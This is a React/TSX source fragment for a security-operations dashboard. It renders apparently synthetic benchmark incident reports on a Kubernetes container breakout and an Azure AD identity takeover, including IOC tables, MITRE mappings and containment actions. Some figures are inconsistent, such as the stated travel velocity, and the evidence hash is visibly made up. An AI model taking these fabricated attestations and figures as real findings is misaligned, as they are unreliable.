        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "28px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div style={{ maxWidth: "680px", margin: "0 auto", fontSize: "12px", lineHeight: "1.7", color: "#253b35" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", borderBottom: "2px solid #236f66", paddingBottom: "14px", marginBottom: "20px" }}>
              <div>
                <strong style={{ fontSize: "14px", color: "#16332b", letterSpacing: "0.5px" }}>KUBERNETES INCIDENT RESPONSE ATTESTATION</strong>
                <div style={{ fontSize: "10px", color: "#6a7f78" }}>Sovereign Autonomous SOC &amp; Cluster Defense Fleet</div>
              </div>
              <div style={{ textAlign: "right" }}>
                <strong style={{ fontSize: "11px", color: "#b45228" }}>CASE-4-K8S-LINUX-CONTAINER-BREAKOUT</strong>
                <div style={{ fontSize: "10px", color: "#6a7f78" }}>Date: October 26, 2026</div>
              </div>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "100px 1fr", gap: "6px", fontSize: "11px", marginBottom: "20px", background: "#fbf6f3", padding: "12px 16px", borderRadius: "5px" }}>
              <strong style={{ color: "#374e47" }}>TO:</strong>
              <span>Security Operations Center &amp; Platform Security Governance</span>
              <strong style={{ color: "#374e47" }}>CLUSTER:</strong>
              <span>worker-k8s-node-03.prod.internal</span>
              <strong style={{ color: "#374e47" }}>SUBJECT:</strong>
              <span>Container Breakout &amp; Kernel Rootkit Remediation Sign-Off</span>
            </div>

            <p>Dear Platform &amp; Security Engineering Committee,</p>
            <p>
              This attestation certifies that all raw security logs within <strong>D:\Security-logs-test\attack-cases-benchmark\case-4-k8s-linux-container-breakout\raw-logs</strong> have been ingested, parsed, cross-correlated, and reconstructed.
            </p>
            <p>
              The container breakout vector (crontab reverse shell &rarr; sudo find privesc &rarr; Diamorphine LKM loading &rarr; host escape via cgroup release_agent) has been fully mapped to MITRE ATT&amp;CK tactics. All containment actions have been codified into <strong>k8s_containment_and_remediation_policy.json</strong>.
            </p>
            <p>Evidence chain-of-custody and rootkit module hashes have been sealed under SHA-256 hash <code>7d8a9e01bc34e56fa2b87c1234901fef890a123b456c789d012e345f678a901b</code>.</p>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "28px", marginTop: "36px", paddingTop: "20px", borderTop: "1px dashed #cfded6" }}>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#1a3831" }}>Kubernetes SOC Lead Analyst</strong>
                <small style={{ color: "#647770" }}>Container Breakout SOC Fleet</small>
                <small style={{ color: "#647770" }}>Signed: 2026-10-26 · SHA-256 Verified</small>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#1a3831" }}>Platform Security Officer</strong>
                <small style={{ color: "#647770" }}>Governance Sign-Off</small>
                <small style={{ color: "#647770" }}>Date of Review: ____________</small>
              </div>
            </div>
          </div>
        </section>
      )}
    </div>
  );
}

function AzureAdDossierView({ onNavigate, onBack }: { onNavigate?: (view: View) => void; onBack?: () => void }) {
  const [activeTab, setActiveTab] = useState<"summary" | "killchain" | "iocs" | "remediation" | "timeline" | "attestation">("summary");
  const [copied, setCopied] = useState(false);
  const [searchFilter, setSearchFilter] = useState("");

  const iocItems = [
    { id: "IOC-AAD-01", tactic: "T1078.004 Cloud Accounts", name: "Impossible Travel Sign-In Anomaly", desc: "Concurrent authentications from London, UK (194.26.29.112) and Amsterdam, NL (185.220.101.45) within 8 minutes (velocity >3,400 km/h).", test: "Azure AD Sign-in Logs: riskEventType=impossibleTravel, RiskLevel=HIGH", status: "BLOCKED" },
    { id: "IOC-AAD-02", tactic: "T1539 Steal Web Cookie", name: "ESTSAUTH & PRT Session Replay", desc: "Attacker replayed stolen Primary Refresh Token (PRT) and session cookies, bypassing interactive MFA prompts.", test: "Azure AD Token Issuance Logs: authenticationMethod=PreviouslySatisfied", status: "REVOKED" },
    { id: "IOC-AAD-03", tactic: "T1098.001 Additional Cloud Credentials", name: "Rogue App Registration Secret", desc: "Adversary created persistent client secret DiagnosticSyncKey-2026 under pre-existing app Financial-Reporting-Sync-App.", test: "Microsoft Graph Audit: Update application - Certificates and secrets management", status: "PURGED" },
    { id: "IOC-AAD-04", tactic: "T1098 Account Manipulation", name: "Elevated Directory Role Binding", desc: "Target application granted RoleManagement.ReadWrite.Directory and Mail.Read delegated/application permissions.", test: "Entra ID AuditLogs: Add app role assignment to service principal", status: "REVERTED" },
    { id: "IOC-AAD-05", tactic: "T1114.002 Remote Email Collection", name: "Graph API Mass Email Exfiltration", desc: "Automated extraction of 4,218 executive mailbox emails via Graph API using Python-urllib/3.10 user agent.", test: "Exchange Online Unified Audit Log: MailItemsAccessed & Graph query volume", status: "CONTAINED" },
    { id: "IOC-AAD-06", tactic: "T1071.001 C2 Web Service", name: "Outbound Exfiltration Endpoint", desc: "Data packaged and uploaded to external staging webhook https://sync-telemetry-cache.net/upload.", test: "Enterprise Edge Firewall & DNS Sinkhole Logs", status: "SINKHOLED" },
  ];

  const filteredIOCs = iocItems.filter((item) => {
    if (!searchFilter.trim()) return true;
    const q = searchFilter.toLowerCase();
    return item.id.toLowerCase().includes(q) || item.name.toLowerCase().includes(q) || item.desc.toLowerCase().includes(q) || item.tactic.toLowerCase().includes(q);
  });

  const containmentActions = [
    { priority: "P1: Critical", action: "Revoke-MgUserSignInSession", target: "alex.vance@contoso-global.com", protocol: "Graph API call revoking all active PRT and OAuth refresh tokens across all endpoints", status: "EXECUTED" },
    { priority: "P1: Critical", action: "Disable Compromised Account", target: "alex.vance@contoso-global.com", protocol: "Set AccountEnabled: false in Microsoft Entra ID; forced password reset flag applied", status: "EXECUTED" },
    { priority: "P1: Critical", action: "Purge Rogue App Client Secret", target: "Financial-Reporting-Sync-App", protocol: "Remove-MgApplicationPassword for KeyId 0x9a8f21bc (DiagnosticSyncKey-2026)", status: "PURGED" },
    { priority: "P2: High", action: "Conditional Access Tor & Anonymizer Block", target: "Tenant-Wide Identity Perimeter", protocol: "Conditional Access policy enforcing immediate block on all known Tor Exit nodes", status: "ACTIVE" },
    { priority: "P2: High", action: "FIDO2 Phishing-Resistant MFA Enforcement", target: "All Executive & Finance Accounts", protocol: "Policy requiring FIDO2 / Windows Hello for Business; disabled SMS/telephony fallbacks", status: "ENFORCED" },
    { priority: "P3: Medium", action: "App Registration Audit & Secret Expiry Audit", target: "All Enterprise Service Principals", protocol: "Automated scan for unmonitored secrets and permissions exceeding least privilege", status: "SCHEDULED" },
  ];

  const azureReportMarkdown = `# Incident Investigation Report: Azure AD Identity Takeover & Impossible Travel
## Case: CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL
**Classification:** CONFIDENTIAL // TLP:AMBER  
**Target Tenant:** Contoso Global Enterprise (Tenant ID: \`0f81d942-8821-4f1a-b62e-9d2a4e819b11\`)  
**Target Identity:** \`alex.vance@contoso-global.com\` (Director of Strategic Finance)  
**Assigned Fleet:** Azure AD & Cloud Identity Defense Fleet  
**Status:** Kill Chain Reconstructed · Autonomous Containment Formulated · Sign-Off Completed  

### 1. Executive Summary & Incident Timeline
A credential compromise and identity takeover incident was detected within the Azure AD tenant. The adversary leveraged compromised primary credentials coupled with an **Impossible Travel** anomaly—authenticating from **London, UK (corporate office)** and subsequently from **Amsterdam, NL (Tor Exit Node)** within an 8-minute window (geographic displacement velocity exceeding 3,400 km/h). 

Following the initial sign-in, the attacker bypassed MFA via session token replay (Primary Refresh Token theft), added a rogue credential to an existing Enterprise Application registration with \`Directory.ReadWrite.All\` privileges, and initiated bulk data exfiltration from OneDrive/SharePoint.

### 2. Multi-Stage Attack Kill Chain Reconstruction (MITRE ATT&CK)
1. **Initial Access & Credential Abuse (T1078.004 / T1110.003):**
   - 08:14:22 UTC: Successful login from London (194.26.29.112).
   - 08:22:05 UTC: Concurrent authentication from Amsterdam Tor Exit Node (185.220.101.45).
   - Anomaly: Identity Protection flagged \`riskEventType: impossibleTravel\` with Risk Level HIGH.
2. **Defense Evasion & Session Hijacking (T1539 / T1556):**
   - Attacker replayed captured \`ESTSAUTH\` cookie and PRT, evading standard MFA prompt.
3. **Persistence & Privilege Escalation (T1098.001):**
   - 08:27:40 UTC: Created client secret \`DiagnosticSyncKey-2026\` under \`Financial-Reporting-Sync-App\`.
   - Granted elevated permissions: \`RoleManagement.ReadWrite.Directory\` and \`Mail.Read\`.
4. **Collection & Exfiltration (T1114.002 / T1567):**
   - 08:31:15 UTC: Scripted API queries via Microsoft.Graph exported 4,218 emails to \`https://sync-telemetry-cache.net/upload\`.

### 3. Neutralized Indicators of Compromise (IOCs)
- **Tor Exit Node:** \`185.220.101.45\` (Blocked)
- **C2 Proxy:** \`194.135.31.88\` (Blocked)
- **Staging Domain:** \`sync-telemetry-cache.net\` (Sinkholed)
- **Compromised Account:** \`alex.vance@contoso-global.com\` (Sessions Revoked / Disabled)
- **Rogue Secret:** \`DiagnosticSyncKey-2026\` (KeyId: \`0x9a8f21bc\`) (Purged)

### 4. Autonomous Containment Actions
- Session revocation executed via \`Revoke-MgUserSignInSession\`.
- Account quarantined and disabled.
- Rogue application credentials removed.
- Tor and anonymizer network block applied in Conditional Access.`;

  function copyMarkdown() {
    navigator.clipboard.writeText(azureReportMarkdown);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function downloadReport() {
    const blob = new Blob([azureReportMarkdown], { type: "text/markdown;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "azure_ad_intrusion_investigation_report.md";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  return (
    <div style={{ animation: "fadeIn 0.2s ease-in-out" }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "16px", flexWrap: "wrap", gap: "10px" }}>
        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
          {onBack && (
            <button className="secondary-button" onClick={onBack} style={{ fontSize: "11px", padding: "6px 12px" }}>
              &larr; All Deliverables
            </button>
          )}
          <PageTitle
            eyebrow="AZURE AD INCIDENT DOSSIER / IDENTITY TAKEOVER &amp; IMPOSSIBLE TRAVEL"
            title="Azure AD Intrusion SOC Investigation"
            subtitle="Autonomous multi-agent correlation: Impossible Travel anomaly, PRT token replay, rogue App registration, and automated containment."
          />
        </div>
        <div style={{ display: "flex", gap: "8px", alignItems: "center" }}>
          <button className="secondary-button" onClick={copyMarkdown} style={{ fontSize: "11px", padding: "6px 12px" }}>
            <Copy size={13} /> {copied ? "Copied Markdown!" : "Copy Markdown"}
          </button>
          <button className="secondary-button" onClick={downloadReport} style={{ fontSize: "11px", padding: "6px 12px" }}>
            <Download size={13} /> Download .md
          </button>
          {onNavigate && (
            <button className="primary-button" onClick={() => onNavigate("Decision rooms")} style={{ fontSize: "11px", padding: "6px 14px", background: "#1c5885" }}>
              <ShieldCheck size={13} /> Decision Rooms (4/4 Approved)
            </button>
          )}
        </div>
      </div>

      <div className="status-banner" style={{ background: "#edf5fc", border: "1px solid #cce2f5", color: "#174468", marginBottom: "16px" }}>
        <i />
        <span>4/4 GOVERNANCE ROOMS SIGNED &amp; APPROVED</span>
        <small>Status: Autonomous Session Revocation &amp; Rogue App Secret Purged</small>
      </div>

      <div
        style={{
          background: "linear-gradient(135deg, #102336 0%, #0d1e30 50%, #173859 100%)",
          border: "1px solid #234c75",
          borderRadius: "8px",
          padding: "22px 28px",
          color: "#f0f6fc",
          boxShadow: "0 4px 20px rgba(16, 35, 54, 0.25)",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          flexWrap: "wrap",
          gap: "18px",
          marginBottom: "16px",
        }}
      >
        <div style={{ flex: "1 1 560px" }}>
          <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "1px", textTransform: "uppercase", color: "#7fc4fd", marginBottom: "4px" }}>
            CASE ID: CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL · TLP:AMBER
          </div>
          <h2 style={{ fontSize: "20px", fontWeight: 700, margin: "4px 0 8px", color: "#ffffff", letterSpacing: "-0.2px" }}>
            Azure AD Identity Takeover &amp; Impossible Travel Dossier
          </h2>
          <p style={{ color: "#c5daf0", fontSize: "11.5px", margin: 0, lineHeight: 1.55, maxWidth: "680px" }}>
            Telemetry correlated across Azure AD sign-in logs, Microsoft Graph API audit trails, and network ingress. Attack chain reconstructed from London/Amsterdam impossible travel anomaly to PRT session replay, rogue enterprise app credentials, and automated session revocation.
          </p>
          <div style={{ display: "flex", gap: "8px", flexWrap: "wrap", marginTop: "12px" }}>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#1c3d5a", color: "#9ecaf5", border: "1px solid #2b5780" }}>
              <ShieldAlert size={12} /> MITRE ATT&amp;CK: 4 Stages Mapped
            </span>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#214436", color: "#8ce2c1", border: "1px solid #326b54" }}>
              <LockKeyhole size={12} /> User Sessions Revoked (Graph API)
            </span>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#4a2428", color: "#f8a8b1", border: "1px solid #753b41" }}>
              <BadgeCheck size={12} /> Rogue App Key Purged
            </span>
            <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#273f59", color: "#b3d7ff", border: "1px solid #3c638c" }}>
              <Shield size={12} /> Conditional Access Tor Block Active
            </span>
          </div>
        </div>
        <div style={{ textAlign: "right", display: "flex", flexDirection: "column", gap: "4px", minWidth: "220px", background: "rgba(0,0,0,0.35)", padding: "14px 18px", borderRadius: "6px", border: "1px solid rgba(255,255,255,0.12)" }}>
          <div style={{ fontSize: "10px", color: "#7fc4fd", textTransform: "uppercase", letterSpacing: "1px", fontWeight: 700 }}>
            INCIDENT SEVERITY
          </div>
          <div style={{ fontSize: "26px", fontWeight: 800, color: "#ff7043", fontFamily: "var(--font-geist-mono), monospace" }}>
            CRITICAL SEV-1
          </div>
          <div style={{ fontSize: "10px", color: "#9ecaf5", fontWeight: 600 }}>
            Identity Takeover Neutralized
          </div>
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(230px, 1fr))", gap: "12px", marginBottom: "18px" }}>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <ShieldAlert size={14} color="#d9534f" /> Incident Classification
          </span>
          <span style={{ fontSize: "20px", fontWeight: 800, color: "#d9534f", letterSpacing: "-0.5px" }}>
            CRITICAL SEV-1
          </span>
          <span style={{ fontSize: "10px", color: "#a84e22", fontWeight: 600 }}>
            Azure AD Identity Takeover
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <Bot size={14} color="#236f66" /> Target Identity
          </span>
          <span style={{ fontSize: "14px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.2px" }}>
            alex.vance@contoso-global.com
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            Director of Strategic Finance
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <Server size={14} color="#236f66" /> Impossible Travel Velocity
          </span>
          <span style={{ fontSize: "18px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.2px" }}>
            3,400+ km/h
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            London (08:14) &rarr; Amsterdam Tor (08:22)
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <BadgeCheck size={14} color="#236f66" /> Governance Assurance
          </span>
          <span style={{ fontSize: "18px", fontWeight: 800, color: "#196656", letterSpacing: "-0.3px" }}>
            4/4 Signed Off
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            Evidence Found &amp; Sealed in Ledger
          </span>
        </div>
      </div>

      <div style={{ display: "flex", gap: "4px", background: "#e8efe9", padding: "4px", borderRadius: "6px", border: "1px solid #dce5df", marginBottom: "16px", overflowX: "auto" }}>
        {[
          { id: "summary", label: "Executive Threat Triage", icon: FileText },
          { id: "killchain", label: "4-Stage Identity Kill Chain", icon: Server },
          { id: "iocs", label: "Neutralized IOCs (6/6)", icon: BadgeCheck },
          { id: "remediation", label: "Graph & Conditional Access Policies", icon: ShieldCheck },
          { id: "timeline", label: "Forensic Chronology", icon: Calendar },
          { id: "attestation", label: "Investigation Sign-Off & Attestation", icon: FileClock },
        ].map(({ id, label, icon: TabIcon }) => {
          const isActive = activeTab === id;
          return (
            <button
              key={id}
              type="button"
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "7px",
                padding: "8px 14px",
                fontSize: "11px",
                fontWeight: isActive ? 700 : 600,
                color: isActive ? "#195d56" : "#566862",
                background: isActive ? "#ffffff" : "transparent",
                border: isActive ? "1px solid #c9d8d1" : "1px solid transparent",
                borderRadius: "4px",
                cursor: "pointer",
                whiteSpace: "nowrap",
                boxShadow: isActive ? "0 1px 3px rgba(0,0,0,0.06)" : "none",
                transition: "all 0.15s ease",
              }}
              onClick={() => setActiveTab(id as typeof activeTab)}
            >
              <TabIcon size={14} color={isActive ? "#236f66" : "#72837d"} />
              <span>{label}</span>
            </button>
          );
        })}
      </div>

      {activeTab === "summary" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">AZURE AD INCIDENT TRIAGE</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Incident Scope &amp; Forensic Analysis</h3>
            </div>
            <span style={{ fontSize: "10px", background: "#fdeee5", color: "#a84e22", padding: "3px 8px", borderRadius: "4px", fontWeight: 700 }}>
              CRITICAL SEV-1
            </span>
          </div>

          <p style={{ fontSize: "12px", lineHeight: "1.7", color: "#30453f", margin: 0 }}>
            At 08:22:05 UTC, Azure AD Identity Protection flagged an <strong>Impossible Travel</strong> anomaly on account <strong>alex.vance@contoso-global.com</strong>. The actor authenticated from London, UK at 08:14 UTC, and only 8 minutes later replayed primary authentication cookies from an Amsterdam Tor Exit Node (185.220.101.45). The attacker bypassed MFA via stolen Primary Refresh Tokens, injected a persistent client secret into enterprise app registration <code>Financial-Reporting-Sync-App</code>, and exfiltrated 4,200+ executive emails via Graph API.
          </p>

          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))", gap: "16px" }}>
            <div style={{ background: "#f8fbf9", border: "1px solid #dce8e1", borderRadius: "6px", padding: "16px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
                <ShieldAlert size={16} color="#d9534f" />
                <strong style={{ fontSize: "12px", color: "#1a362f" }}>Compromise Vectors Identified</strong>
              </div>
              <ul style={{ margin: 0, paddingLeft: "18px", fontSize: "11px", color: "#475e56", lineHeight: "1.7" }}>
                <li><strong>Impossible Travel:</strong> London (08:14 UTC) to Amsterdam Tor (08:22 UTC).</li>
                <li><strong>PRT Token Theft &amp; Replay:</strong> ESTSAUTH session cookies replayed from browser cache.</li>
                <li><strong>Backdoor Credential:</strong> Client secret <code>DiagnosticSyncKey-2026</code> added to app.</li>
                <li><strong>Data Exfiltration:</strong> Graph API script scraped financial emails to external server.</li>
              </ul>
            </div>

            <div style={{ background: "#f8fbf9", border: "1px solid #dce8e1", borderRadius: "6px", padding: "16px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
                <ShieldCheck size={16} color="#236f66" />
                <strong style={{ fontSize: "12px", color: "#1a362f" }}>Autonomous Containment Enforced</strong>
              </div>
              <ul style={{ margin: 0, paddingLeft: "18px", fontSize: "11px", color: "#475e56", lineHeight: "1.7" }}>
                <li><strong>Graph API Session Kill:</strong> <code>Revoke-MgUserSignInSession</code> executed.</li>
                <li><strong>Account Quarantined:</strong> Account disabled pending physical identity verification.</li>
                <li><strong>Secret Purged:</strong> Rogue application secret deleted immediately.</li>
                <li><strong>Conditional Access Block:</strong> All Tor &amp; proxy exit networks blocked tenant-wide.</li>
              </ul>
            </div>
          </div>
        </section>
      )}

      {activeTab === "killchain" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "18px" }}>
            <div className="eyebrow">RECONSTRUCTED ATTACK PATH</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>4-Stage Azure AD Identity Takeover Kill Chain</h3>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(240px, 1fr))", gap: "14px" }}>
            {[
              { num: "01", stage: "Initial Access & Impossible Travel", tech: "T1078.004 / T1110.003", desc: "Password spray / credential stuffing against corporate accounts; impossible travel detected between UK and Netherlands Tor IP." },
              { num: "02", stage: "PRT Session Hijacking & MFA Bypass", tech: "T1539 / T1556", desc: "Replayed stolen ESTSAUTH and Primary Refresh Tokens from endpoint cache to bypass MFA challenge without prompting user." },
              { num: "03", stage: "App Registration Secret Injection", tech: "T1098.001", desc: "Added persistent client secret DiagnosticSyncKey-2026 under pre-approved multi-tenant app Financial-Reporting-Sync-App." },
              { num: "04", stage: "Graph API Mass Exfiltration", tech: "T1114.002 / T1567", desc: "Automated PowerShell script leveraged Mail.Read permissions to scrape and exfiltrate 4,218 financial emails to webhook." },
            ].map((s) => (
              <div key={s.num} style={{ background: "#f8fbf9", border: "1px solid #dae7e0", borderRadius: "6px", padding: "16px", display: "flex", flexDirection: "column", gap: "6px" }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                  <span style={{ fontSize: "18px", fontWeight: 800, color: "#236f66", fontFamily: "var(--font-geist-mono), monospace" }}>{s.num}</span>
                  <span style={{ fontSize: "9px", background: "#eef5f1", color: "#2d6356", padding: "2px 6px", borderRadius: "3px", fontWeight: 700 }}>{s.tech}</span>
                </div>
                <strong style={{ fontSize: "12px", color: "#18322b" }}>{s.stage}</strong>
                <p style={{ fontSize: "11px", color: "#546a63", margin: 0, lineHeight: 1.55 }}>{s.desc}</p>
              </div>
            ))}
          </div>
        </section>
      )}

      {activeTab === "iocs" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "16px", flexWrap: "wrap", gap: "10px" }}>
            <div>
              <div className="eyebrow">NEUTRALIZED THREAT INDICATORS</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Extracted Identity &amp; Network IOCs (6/6)</h3>
            </div>
            <input
              placeholder="Filter IOCs..."
              value={searchFilter}
              onChange={(e) => setSearchFilter(e.target.value)}
              style={{ padding: "6px 12px", fontSize: "11px", border: "1px solid #cad8d1", borderRadius: "4px", width: "220px" }}
            />
          </div>

          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
              <thead>
                <tr style={{ background: "#f3f8f5", borderBottom: "1px solid #dfeae3" }}>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>IOC ID</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>MITRE Technique</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Threat Indicator</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Forensic Description</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Status</th>
                </tr>
              </thead>
              <tbody>
                {filteredIOCs.map((ioc) => (
                  <tr key={ioc.id} style={{ borderBottom: "1px solid #edf4ef" }}>
                    <td style={{ padding: "10px 12px", fontFamily: "var(--font-geist-mono), monospace", color: "#236f66", fontWeight: 700 }}>{ioc.id}</td>
                    <td style={{ padding: "10px 12px", color: "#546a63" }}>{ioc.tactic}</td>
                    <td style={{ padding: "10px 12px", fontWeight: 700, color: "#19352e" }}>{ioc.name}</td>
                    <td style={{ padding: "10px 12px", color: "#556b64", maxWidth: "340px" }}>{ioc.desc}</td>
                    <td style={{ padding: "10px 12px" }}>
                      <span style={{ fontSize: "9px", padding: "2px 7px", borderRadius: "3px", fontWeight: 700, background: "#eef7f3", color: "#186352", border: "1px solid #cce8dc" }}>
                        {ioc.status}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}

      {activeTab === "remediation" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">AUTOMATED REMEDIATION &amp; GOVERNANCE</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Conditional Access &amp; Graph Containment Policies</h3>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
            {containmentActions.map((act, i) => (
              <div key={i} style={{ background: "#f8fbf9", border: "1px solid #dae7e0", borderRadius: "6px", padding: "12px 16px", display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
                  <span style={{ fontSize: "9px", fontWeight: 700, padding: "3px 7px", borderRadius: "3px", background: act.priority.includes("P1") ? "#fdeee5" : "#eef5f1", color: act.priority.includes("P1") ? "#a84e22" : "#2d6356" }}>
                    {act.priority}
                  </span>
                  <div>
                    <strong style={{ fontSize: "12px", color: "#19352e", display: "block" }}>{act.action}</strong>
                    <code style={{ fontSize: "10px", color: "#4f6860", background: "#eef4f1", padding: "1px 5px", borderRadius: "3px" }}>{act.target}</code>
                    <p style={{ fontSize: "11px", color: "#5d736c", margin: "4px 0 0" }}>{act.protocol}</p>
                  </div>
                </div>
                <span style={{ fontSize: "9px", padding: "3px 8px", borderRadius: "3px", fontWeight: 700, background: "#e4f3ed", color: "#186656", border: "1px solid #bce1d3" }}>
                  {act.status}
                </span>
              </div>
            ))}
          </div>
        </section>
      )}

      {activeTab === "timeline" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "20px" }}>
            <div className="eyebrow">CHRONOLOGICAL EVENT LOG</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Incident Sequence (UTC)</h3>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: "14px", borderLeft: "2px solid #236f66", paddingLeft: "18px", marginLeft: "8px" }}>
            {[
              { time: "08:14:22 UTC", event: "Legitimate Corporate Login (London)", source: "Azure AD Sign-In", detail: "alex.vance@contoso-global.com logged in successfully from 194.26.29.112 (London HQ) via Edge." },
              { time: "08:22:05 UTC", event: "Impossible Travel Anomaly (Amsterdam Tor)", source: "Identity Protection", detail: "Authentication from 185.220.101.45 (Tor Exit Node). Displacement velocity 3,400+ km/h flagged as HIGH risk." },
